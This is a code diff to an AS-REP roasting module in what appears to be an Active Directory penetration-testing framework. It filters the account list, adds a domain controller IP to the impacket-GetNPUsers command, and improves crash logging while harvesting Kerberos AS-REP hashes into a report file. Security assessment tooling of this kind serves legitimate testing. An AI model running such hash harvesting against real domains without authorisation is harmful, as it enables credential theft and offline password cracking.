@@ -207,6 +207,16 @@ class ASREPRoastingModule:
             tempfile.gettempdir(),
             f"adpf_{state.assessment_id}_asrep_users.txt",
         )
+        # ── Clean user list ─────────────────────────────────────────────
+        # Strip empty entries, whitespace-only names, and computer accounts
+        # (ending in $) which can cause impacket to crash.
+        user_pool = [
+            u.strip() for u in user_pool
+            if u and u.strip() and not u.strip().endswith("$")
+        ]
+        if not user_pool:
+            return self._error("User list is empty after filtering — nothing to test.")
+
         _write_userlist(user_pool, tmp_path)
 
         # Output hash file — impacket writes hashes HERE, not to stdout.
@@ -215,17 +225,17 @@ class ASREPRoastingModule:
             os.path.join(REPORTS_DIR, f"{state.assessment_id}-asrep.txt")
         )
 
-        # ── Run GetNPUsers ──────────────────────────────────────────────
-        # Exact working command — no -outputfile, no -dc-ip, no -no-pass:
-        #   impacket-GetNPUsers VulnAd.ma/ -usersfile users-rid.txt
+        # Exact working command with -dc-ip to guarantee KDC resolution.
+        # Without -dc-ip, impacket does a DNS SRV lookup for the KDC which
+        # can crash (Python traceback) inside a subprocess even when the same
+        # DNS lookup works from a terminal session.
         #
-        # When -outputfile IS passed, impacket silences stdout and only writes
-        # to the file.  Without it, hashes print to stdout — we capture those
-        # and save the file ourselves.
+        #   impacket-GetNPUsers VulnAd.ma/ -usersfile users-rid.txt -dc-ip <IP>
         command = [
             binary,
             f"{domain}/",
             "-usersfile", tmp_path,
+            "-dc-ip",    target,
         ]
 
         from rich.console import Console as _RCon
@@ -242,14 +252,17 @@ class ASREPRoastingModule:
         )
         combined = result["output"] + "\n" + result["error"]
 
-        # Log raw output so if hashes are still missing it's diagnosable
         from rich.console import Console as _RCon2
         if not combined.strip():
             _RCon2().print("  [bold red]WARNING: impacket returned empty output — possible timeout or binary issue.[/bold red]")
+        elif "traceback" in combined.lower():
+            # Print the FULL exception so it's visible in the terminal
+            _RCon2().print(f"  [bold red]impacket CRASH ({len(combined)} chars):[/bold red]")
+            for line in combined.strip().splitlines()[:20]:
+                _RCon2().print(f"  [red]{line}[/red]")
         else:
-            # Show first line of output as a sanity check
-            first_line = combined.strip().splitlines()[0] if combined.strip() else ""
-            _RCon2().print(f"  [dim]impacket output ({len(combined)} chars): {first_line[:100]}[/dim]")
+            first_line = combined.strip().splitlines()[0]
+            _RCon2().print(f"  [dim]impacket output ({len(combined)} chars): {first_line[:120]}[/dim]")
 
         # ── Parse hashes from stdout ─────────────────────────────────────
         # impacket prints $krb5asrep$... lines directly to stdout when
